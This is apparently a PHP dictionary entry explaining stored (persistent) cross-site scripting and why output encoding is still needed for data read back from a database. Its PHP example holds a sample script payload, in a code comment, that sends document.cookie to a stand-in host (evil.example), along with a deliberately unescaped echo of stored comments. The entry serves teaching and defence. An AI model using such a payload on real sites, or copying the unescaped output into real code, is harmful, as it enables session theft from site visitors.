# Stored XSS
Stored XSS, also called persistent XSS, is a variant of ``XSS`` where the malicious payload is saved on the server, in a database, a comment field, a log, or any other storage the application later reads back, instead of being reflected immediately from the current request.

Because the payload is persisted, every user who later views the page containing it executes the attacker's script, with no need to click a crafted link or visit a special URL, unlike reflected XSS. This also makes stored XSS more dangerous: a single injection can affect every visitor, including administrators.

Stored XSS commonly slips through when a team treats the database as an implicitly trusted source, sanitizing or validating data only on the way in, and then trusting it enough to skip output encoding on the way out. The database itself provides no protection: encoding must still be applied at the point where the stored value is written into HTML, JavaScript, or another output context.
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@graph":[{"@type":"DefinedTerm","@id":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/dictionary\/index\/stored-xss.ini.html","url":"https:\/\/php-dictionary.readthedocs.io\/en\/latest\/dictionary\/index\/stored-xss.ini.html","name":"Stored XSS","isPartOf":{"@id":"https:\/\/www.exakat.io\/"},"datePublished":"Wed, 05 Aug 2026 08:12:40 +0000","dateModified":"Wed, 05 Aug 2026 08:12:40 +0000","description":"Stored XSS, also called persistent XSS, is a variant of ``XSS`` where the malicious payload is saved on the server, in a database, a comment field, a log, or any other storage the application later reads back, instead of being reflected immediately from the current request","inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https:\/\/php-dictionary.readthedocs.io\/en\/latest\/dictionary\/index\/Stored XSS.html"]}]},{"@type":"WebSite","@id":"https:\/\/www.exakat.io\/","url":"https:\/\/www.exakat.io\/","name":"Exakat","description":"Smart PHP static analysis","inLanguage":"en-US"}]}</script>
```php
<?php

    // Write path: attacker submits a malicious comment.
    $body = $_POST['comment']; // e.g. '<script>document.location="//evil.example/?c="+document.cookie</script>'
    $pdo->prepare('INSERT INTO comments (body) VALUES (?)')->execute([$body]);

    // Read path, later, for every visitor: raw output re-executes the payload.
    foreach ($pdo->query('SELECT body FROM comments') as $comment) {
        echo $comment['body']; // vulnerable: should be htmlspecialchars($comment['body'])
    }

?>
```

**[Documentation](https://owasp.org/www-community/Types_of_Cross-Site_Scripting)**
## See Also

+ [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored)

## Related

+ [Cross Site Scripting (XSS)](xss.ini.html)
+ [HTML Escaping](escape-html.ini.html)
+ [Sanitation](sanitation.ini.html)
+ [HTMLPurifier](htmlpurifier.ini.html)
+ [Taint Analysis](taint.ini.html)
+ [Database](database.ini.html)
+ [Write Context](write-context.ini.html)
